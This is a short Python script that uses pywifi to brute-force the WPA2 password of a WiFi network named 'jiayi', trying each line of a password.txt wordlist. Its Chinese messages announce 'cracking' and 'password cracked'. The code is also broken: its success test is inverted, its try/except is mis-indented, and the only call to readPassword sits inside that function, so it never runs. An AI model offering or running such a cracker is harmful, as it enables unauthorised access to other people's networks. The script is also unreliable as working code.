#!/usr/bin/env python3
#_*_coding:utf-8_*_

import pywifi
from pywifi import const
import time

def wificonnect(pwd):
	wifi=pywifi.pywifi()
	ifaces=wifi.interfaces()[0]
	ifaces.disconnect()
	time.sleep(1)
	wifistatus=ifaces.status()
	if wifistatus ==const.IFACE_DISCONNECTED:
		profile=pywifi.profile()
		profile.ssid="jiayi"
		profile.auth=const.AUTH_ALG_OPEN
		profile.akm.append(const.AKM_TYPE_WPA2PSK)
		profile.cipher=const.CIPHER_TYPE_CCMP
		profile.key=pwd
		ifaces.remove_all_network_profiles()
		tep_profile=ifaces.add_network_profile(profile)
		ifaces.connect(tep_profile)
		time.sleep(3)
		if ifaces.status()==const.IFACE_DISCONNECTED:
			return True
		else:
			return False
	else:
		print("已有wifi链接")

def readPassword():
	print("开始破解")
	path="./password.txt"
	file = open(path,"r")
	while True:
		try:
			pad=file.readline()
			bool=wificonnect(pad)

			if bool:
				print("密码已破解:",pad)
				print("WIFI以自动连接!!")
				break
			else:
				print("密码破解中.....密码校对：",pad)
			except:
				continue

	readPassword()